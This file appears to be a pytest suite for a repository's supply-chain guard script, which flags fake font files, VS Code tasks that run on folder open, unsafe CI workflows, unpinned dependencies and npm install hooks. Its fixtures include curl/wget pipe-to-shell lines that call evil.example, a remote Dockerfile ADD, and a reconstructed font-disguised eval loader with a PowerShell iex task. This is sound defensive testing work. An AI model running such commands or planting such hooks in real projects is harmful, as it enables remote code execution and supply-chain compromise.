"""Tests for the supply-chain guard in ``scripts/check_assets.py``.

The repository once shipped an obfuscated JavaScript payload disguised as
``public/fonts/fa-solid-500.woff2`` plus a ``.vscode/tasks.json`` that ran it
on folder open. These tests keep that attack — and the wider supply-chain
shapes the guard now covers — from ever landing again.

Each test builds a minimal fake repository tree in ``tmp_path`` and asserts
that ``find_violations()`` flags exactly the expected problem. A few tests also
assert that benign files do *not* trip the guard (no false positives).
"""

from __future__ import annotations

import importlib.util
import json
from pathlib import Path

_SCRIPT = Path(__file__).resolve().parent.parent / "scripts" / "check_assets.py"
_spec = importlib.util.spec_from_file_location("check_assets", _SCRIPT)
check_assets = importlib.util.module_from_spec(_spec)
_spec.loader.exec_module(check_assets)

#: A real WOFF2 file starts with this magic.
WOFF2_MAGIC = b"wOF2"

#: A minimal workflow that satisfies every policy rule, for the clean cases.
GOOD_WORKFLOW = """\
name: CI
on:
  push:
    branches: [main]
  pull_request:

permissions:
  contents: read

jobs:
  build:
    runs-on: ubuntu-latest
    timeout-minutes: 10
    steps:
      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683
        with:
          persist-credentials: false
      - run: echo ok
"""


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------


def violations(tmp_path: Path) -> list[str]:
    """Run the guard over a fake repository tree."""
    return check_assets.find_violations(tmp_path)


def write(root: Path, relpath: str, content: str | bytes) -> Path:
    """Write a file inside the fake tree, creating parent directories."""
    path = root / relpath
    path.parent.mkdir(parents=True, exist_ok=True)
    if isinstance(content, bytes):
        path.write_bytes(content)
    else:
        path.write_text(content, encoding="utf-8")
    return path


def install_real_guard(tmp_path: Path) -> None:
    """Copy the real guard into the fake tree so the tripwire is satisfied."""
    repo = _SCRIPT.parent.parent
    write(tmp_path, "scripts/check_assets.py", _SCRIPT.read_text(encoding="utf-8"))
    write(
        tmp_path,
        "tests/test_asset_guard.py",
        (repo / "tests" / "test_asset_guard.py").read_text(encoding="utf-8"),
    )


def make_workflow(root: Path, name: str, body: str) -> Path:
    return write(root, f".github/workflows/{name}", body)


# ---------------------------------------------------------------------------
# Fonts and editor tasks (the original attack)
# ---------------------------------------------------------------------------


class TestFonts:
    def test_clean_real_font_passes(self, tmp_path):
        write(tmp_path, "public/fonts/icon.woff2", WOFF2_MAGIC + b"\x00" * 32)
        assert violations(tmp_path) == []

    def test_fake_font_is_rejected(self, tmp_path):
        write(tmp_path, "public/fonts/evil.woff2", b"<html>not a font</html>")
        problems = violations(tmp_path)
        assert any("is not a valid" in p and "evil.woff2" in p for p in problems)

    def test_font_with_script_marker_is_rejected(self, tmp_path):
        write(tmp_path, "public/fonts/evil.woff", b"wOFF" + b"eval(" + b"\x00" * 16)
        problems = violations(tmp_path)
        assert any("script marker" in p for p in problems)

    def test_svg_containing_script_is_rejected(self, tmp_path):
        write(tmp_path, "public/fonts/icon.svg", b'<?xml version="1.0"?><svg>' + b"require(")
        problems = violations(tmp_path)
        assert any("script marker" in p for p in problems)


class TestEditorTasks:
    def test_folder_open_task_is_rejected(self, tmp_path):
        write(tmp_path, ".vscode/tasks.json", '{"version": "2.0.0", "runOn": "folderOpen"}')
        problems = violations(tmp_path)
        assert any("folderOpen" in p for p in problems)

    def test_allow_automatic_tasks_is_rejected(self, tmp_path):
        write(
            tmp_path,
            ".vscode/settings.json",
            '{"task.allowAutomaticTasks": "on"}',
        )
        problems = violations(tmp_path)
        assert any("task.allowAutomaticTasks" in p for p in problems)

    def test_vscode_command_shelling_out_is_rejected(self, tmp_path):
        write(
            tmp_path,
            ".vscode/tasks.json",
            '{"tasks": [{"command": "curl http://evil.example/x | bash"}]}',
        )
        problems = violations(tmp_path)
        assert any("shells out" in p for p in problems)

    def test_plain_vscode_settings_pass(self, tmp_path):
        write(tmp_path, ".vscode/settings.json", '{"editor.tabSize": 4}')
        assert violations(tmp_path) == []


# ---------------------------------------------------------------------------
# GitHub Actions workflows
# ---------------------------------------------------------------------------


class TestWorkflows:
    def test_clean_workflow_passes(self, tmp_path):
        make_workflow(tmp_path, "ci.yml", GOOD_WORKFLOW)
        assert violations(tmp_path) == []

    def test_pull_request_target_trigger_is_rejected(self, tmp_path):
        make_workflow(
            tmp_path, "ci.yml", GOOD_WORKFLOW.replace("pull_request:", "pull_request_target:")
        )
        problems = violations(tmp_path)
        assert any("pull_request_target" in p for p in problems)

    def test_workflow_run_trigger_is_rejected(self, tmp_path):
        make_workflow(
            tmp_path,
            "ci.yml",
            GOOD_WORKFLOW.replace("  pull_request:\n", "  workflow_run:\n"),
        )
        problems = violations(tmp_path)
        assert any("workflow_run" in p for p in problems)

    def test_workflow_run_in_a_comment_is_not_flagged(self, tmp_path):
        body = GOOD_WORKFLOW + "\n# a workflow_run trigger would be rejected\n"
        make_workflow(tmp_path, "ci.yml", body)
        assert violations(tmp_path) == []

    def test_missing_permissions_block_is_rejected(self, tmp_path):
        body = "\n".join(
            line for line in GOOD_WORKFLOW.splitlines() if not line.startswith("permissions:")
        )
        make_workflow(tmp_path, "ci.yml", body)
        problems = violations(tmp_path)
        assert any("does not declare a top-level 'permissions:'" in p for p in problems)

    def test_contents_write_is_rejected(self, tmp_path):
        make_workflow(
            tmp_path,
            "ci.yml",
            GOOD_WORKFLOW.replace("contents: read", "contents: write"),
        )
        problems = violations(tmp_path)
        assert any("'contents' write permission" in p for p in problems)

    def test_unpinned_action_is_rejected(self, tmp_path):
        make_workflow(
            tmp_path,
            "ci.yml",
            GOOD_WORKFLOW.replace("11bd71901bbe5b1630ceea73d27597364c9af683", "v4"),
        )
        problems = violations(tmp_path)
        assert any("not pinned to a full commit SHA" in p for p in problems)

    def test_short_sha_is_rejected(self, tmp_path):
        make_workflow(
            tmp_path,
            "ci.yml",
            GOOD_WORKFLOW.replace("11bd71901bbe5b1630ceea73d27597364c9af683", "11bd719"),
        )
        problems = violations(tmp_path)
        assert any("not pinned to a full commit SHA" in p for p in problems)

    def test_secrets_in_pull_request_workflow_are_rejected(self, tmp_path):
        make_workflow(
            tmp_path,
            "ci.yml",
            GOOD_WORKFLOW.replace("      - run: echo ok", "      - run: echo ${{ secrets.TOKEN }}"),
        )
        problems = violations(tmp_path)
        assert any("reads secrets.*" in p for p in problems)

    def test_secrets_in_push_only_workflow_are_allowed(self, tmp_path):
        body = GOOD_WORKFLOW.replace("  pull_request:\n", "")
        body = body.replace("      - run: echo ok", "      - run: echo ${{ secrets.TOKEN }}")
        make_workflow(tmp_path, "ci.yml", body)
        assert violations(tmp_path) == []

    def test_checkout_without_persist_credentials_false_is_rejected(self, tmp_path):
        make_workflow(
            tmp_path,
            "ci.yml",
            GOOD_WORKFLOW.replace("          persist-credentials: false\n", ""),
        )
        problems = violations(tmp_path)
        assert any("persist-credentials" in p for p in problems)

    def test_persist_credentials_true_is_rejected(self, tmp_path):
        make_workflow(
            tmp_path,
            "ci.yml",
            GOOD_WORKFLOW.replace("persist-credentials: false", "persist-credentials: true"),
        )
        problems = violations(tmp_path)
        assert any("persist-credentials: true" in p for p in problems)


# ---------------------------------------------------------------------------
# Python requirements
# ---------------------------------------------------------------------------


class TestRequirements:
    def test_clean_requirements_pass(self, tmp_path):
        write(tmp_path, "requirements.txt", "flask==3.1.3\nrequests==2.33.0\n")
        write(tmp_path, "requirements-dev.txt", "pytest==9.0.3\n")
        assert violations(tmp_path) == []

    def test_unpinned_requirement_is_rejected(self, tmp_path):
        write(tmp_path, "requirements.txt", "flask>=3.0\n")
        problems = violations(tmp_path)
        assert any("requirements.txt:1" in p and "==" in p for p in problems)

    def test_extra_index_url_is_rejected(self, tmp_path):
        write(
            tmp_path,
            "requirements.txt",
            "--extra-index-url https://evil.example/simple\nflask==3.1.3\n",
        )
        problems = violations(tmp_path)
        assert any("evil.example" in p for p in problems)

    def test_direct_url_requirement_is_rejected(self, tmp_path):
        write(tmp_path, "requirements.txt", "flask @ https://evil.example/flask.whl\n")
        problems = violations(tmp_path)
        assert any("direct URL" in p for p in problems)

    def test_git_requirement_is_rejected(self, tmp_path):
        write(tmp_path, "requirements.txt", "git+https://github.com/evil/flask.git\n")
        problems = violations(tmp_path)
        assert any("direct URL" in p for p in problems)


# ---------------------------------------------------------------------------
# npm manifests
# ---------------------------------------------------------------------------


class TestNpm:
    def test_clean_npm_tree_passes(self, tmp_path):
        write(
            tmp_path,
            "package.json",
            json.dumps(
                {
                    "name": "app",
                    "scripts": {"test": "vitest"},
                    "devDependencies": {"vitest": "^5.0.5"},
                }
            ),
        )
        write(
            tmp_path,
            "package-lock.json",
            json.dumps(
                {
                    "packages": {
                        "": {"name": "app"},
                        "node_modules/vitest": {
                            "resolved": "https://registry.npmjs.org/vitest/-/vitest-5.0.5.tgz",
                            "integrity": "sha512-abc==",
                        },
                    }
                }
            ),
        )
        assert violations(tmp_path) == []

    def test_postinstall_script_is_rejected(self, tmp_path):
        write(
            tmp_path,
            "package.json",
            json.dumps({"scripts": {"postinstall": "node ./evil.js"}}),
        )
        problems = violations(tmp_path)
        assert any("'postinstall' lifecycle script" in p for p in problems)

    def test_preinstall_script_is_rejected(self, tmp_path):
        write(
            tmp_path,
            "package.json",
            json.dumps({"scripts": {"preinstall": "node ./evil.js"}}),
        )
        problems = violations(tmp_path)
        assert any("lifecycle script" in p for p in problems)

    def test_non_registry_resolved_url_is_rejected(self, tmp_path):
        write(tmp_path, "package.json", json.dumps({"name": "app"}))
        write(
            tmp_path,
            "package-lock.json",
            json.dumps(
                {
                    "packages": {
                        "node_modules/left-pad": {
                            "resolved": "https://evil.example/left-pad.tgz",
                            "integrity": "sha512-abc==",
                        }
                    }
                }
            ),
        )
        problems = violations(tmp_path)
        assert any("evil.example" in p for p in problems)

    def test_missing_integrity_hash_is_rejected(self, tmp_path):
        write(tmp_path, "package.json", json.dumps({"name": "app"}))
        write(
            tmp_path,
            "package-lock.json",
            json.dumps(
                {
                    "packages": {
                        "node_modules/left-pad": {
                            "resolved": "https://registry.npmjs.org/left-pad/-/left-pad-1.0.0.tgz"
                        }
                    }
                }
            ),
        )
        problems = violations(tmp_path)
        assert any("no integrity hash" in p for p in problems)

    def test_declared_but_unlocked_dependency_is_rejected(self, tmp_path):
        write(
            tmp_path,
            "package.json",
            json.dumps({"name": "app", "dependencies": {"left-pad": "^1.0.0"}}),
        )
        write(tmp_path, "package-lock.json", json.dumps({"packages": {"": {"name": "app"}}}))
        problems = violations(tmp_path)
        assert any("does not contain the declared dependency 'left-pad'" in p for p in problems)

    def test_transitive_deps_may_exist_in_lock_only(self, tmp_path):
        write(
            tmp_path,
            "package.json",
            json.dumps({"name": "app", "devDependencies": {"vitest": "^5.0.5"}}),
        )
        write(
            tmp_path,
            "package-lock.json",
            json.dumps(
                {
                    "packages": {
                        "": {"name": "app"},
                        "node_modules/vitest": {
                            "resolved": "https://registry.npmjs.org/vitest/-/vitest-5.0.5.tgz",
                            "integrity": "sha512-abc==",
                        },
                        "node_modules/tinybench": {
                            "resolved": "https://registry.npmjs.org/tinybench/-/tinybench-4.0.0.tgz",
                            "integrity": "sha512-def==",
                        },
                    }
                }
            ),
        )
        assert violations(tmp_path) == []

    def test_invalid_package_json_is_rejected(self, tmp_path):
        write(tmp_path, "package.json", "{not json")
        problems = violations(tmp_path)
        assert any("not valid JSON" in p for p in problems)


# ---------------------------------------------------------------------------
# Dockerfiles and install scripts
# ---------------------------------------------------------------------------


class TestContainerAndScripts:
    def test_clean_dockerfile_passes(self, tmp_path):
        write(
            tmp_path,
            "Dockerfile",
            "FROM python:3.12-slim\nCOPY requirements.txt .\nRUN pip install -r requirements.txt\n",
        )
        assert violations(tmp_path) == []

    def test_curl_pipe_sh_is_rejected(self, tmp_path):
        write(tmp_path, "install.sh", "curl https://evil.example/install.sh | sh\n")
        problems = violations(tmp_path)
        assert any("pipes a download straight into a shell" in p for p in problems)

    def test_wget_pipe_bash_is_rejected(self, tmp_path):
        write(tmp_path, "install.sh", "wget -qO- https://evil.example/x | bash\n")
        problems = violations(tmp_path)
        assert any("pipes a download straight into a shell" in p for p in problems)

    def test_insecure_download_flag_is_rejected(self, tmp_path):
        write(
            tmp_path,
            "Dockerfile",
            "RUN pip install --trusted-host evil.example flask==3.1.3\n",
        )
        problems = violations(tmp_path)
        assert any("transport security" in p for p in problems)

    def test_add_remote_url_is_rejected(self, tmp_path):
        write(tmp_path, "Dockerfile", "ADD https://evil.example/payload.sh /tmp/\n")
        problems = violations(tmp_path)
        assert any("ADD with a remote URL" in p for p in problems)

    def test_unpinned_pip_install_in_dockerfile_is_rejected(self, tmp_path):
        write(tmp_path, "Dockerfile", "RUN pip install flask\n")
        problems = violations(tmp_path)
        assert any("pip package without an exact '==' pin" in p for p in problems)

    def test_pinned_pip_install_passes(self, tmp_path):
        write(tmp_path, "Dockerfile", "RUN pip install flask==3.1.3\n")
        assert violations(tmp_path) == []

    def test_pip_install_r_passes(self, tmp_path):
        write(tmp_path, "Dockerfile", "RUN pip install -r requirements.txt\n")
        assert violations(tmp_path) == []

    def test_unpinned_npm_install_in_script_is_rejected(self, tmp_path):
        write(tmp_path, "setup.sh", "npm install left-pad\n")
        problems = violations(tmp_path)
        assert any("npm package without a pinned '@version'" in p for p in problems)

    def test_pinned_npm_install_passes(self, tmp_path):
        write(tmp_path, "setup.sh", "npm install left-pad@1.3.0\n")
        assert violations(tmp_path) == []

    def test_npm_ci_passes(self, tmp_path):
        write(tmp_path, "setup.sh", "npm ci\n")
        assert violations(tmp_path) == []


# ---------------------------------------------------------------------------
# .gitignore and guard integrity
# ---------------------------------------------------------------------------


class TestGitignoreAndGuard:
    def test_gitignore_that_ignores_itself_is_rejected(self, tmp_path):
        write(tmp_path, ".gitignore", "node_modules\n.gitignore\n")
        problems = violations(tmp_path)
        assert any("ignores itself" in p for p in problems)

    def test_normal_gitignore_passes(self, tmp_path):
        write(tmp_path, ".gitignore", "node_modules\n__pycache__\n")
        assert violations(tmp_path) == []

    def test_empty_tree_has_no_violations(self, tmp_path):
        assert violations(tmp_path) == []

    def test_gutted_guard_is_detected(self, tmp_path):
        """Removing checks from the guard must trip the tripwire."""
        write(tmp_path, "scripts/check_assets.py", '"just a harmless script"\n')
        problems = violations(tmp_path)
        assert any("may have been weakened" in p for p in problems)

    def test_missing_guard_test_is_detected(self, tmp_path):
        guard_text = _SCRIPT.read_text(encoding="utf-8")
        write(tmp_path, "scripts/check_assets.py", guard_text)
        problems = violations(tmp_path)
        assert any("tests/test_asset_guard.py is missing" in p for p in problems)

    def test_guard_skips_virtualenv_and_node_modules(self, tmp_path):
        install_real_guard(tmp_path)
        # A fake font inside node_modules must not trip the font check.
        write(tmp_path, "node_modules/pkg/font.woff2", b"definitely not a font")
        write(tmp_path, ".venv/lib/x.woff2", b"definitely not a font")
        write(tmp_path, ".venv-sec/lib/x.woff2", b"definitely not a font")
        assert violations(tmp_path) == []


# ---------------------------------------------------------------------------
# End-to-end: the historical attack shape must be blocked
# ---------------------------------------------------------------------------


def test_historical_attack_is_blocked(tmp_path):
    """The exact payload shape from the incident must be rejected."""
    write(tmp_path, "public/fonts/fa-solid-500.woff2", b"function(){eval(atob('...'))}")
    write(
        tmp_path,
        ".vscode/tasks.json",
        json.dumps(
            {
                "version": "2.0.0",
                "tasks": [
                    {
                        "label": "setup",
                        "runOptions": {"runOn": "folderOpen"},
                        "command": "powershell -c iex (Get-Content font)",
                    }
                ],
            }
        ),
    )
    problems = violations(tmp_path)
    assert any("is not a valid" in p for p in problems)
    assert any("folderOpen" in p for p in problems)
    assert any("shells out" in p for p in problems)


def test_multiple_violations_are_all_reported(tmp_path):
    write(tmp_path, "requirements.txt", "flask\n")
    make_workflow(
        tmp_path, "bad.yml", GOOD_WORKFLOW.replace("pull_request:", "pull_request_target:")
    )
    problems = violations(tmp_path)
    assert any("requirements.txt:1" in p for p in problems)
    assert any("pull_request_target" in p for p in problems)


# ---------------------------------------------------------------------------
# CLI behaviour
# ---------------------------------------------------------------------------


def test_main_returns_zero_when_clean(tmp_path, monkeypatch, capsys):
    monkeypatch.setattr(check_assets, "REPO_ROOT", tmp_path)
    assert check_assets.main() == 0
    assert "No suspicious assets" in capsys.readouterr().out


def test_main_returns_one_and_lists_problems(tmp_path, monkeypatch, capsys):
    write(tmp_path, "requirements.txt", "flask\n")
    monkeypatch.setattr(check_assets, "REPO_ROOT", tmp_path)
    assert check_assets.main() == 1
    out = capsys.readouterr().out
    assert "Blocked: suspicious assets" in out
    assert "requirements.txt:1" in out
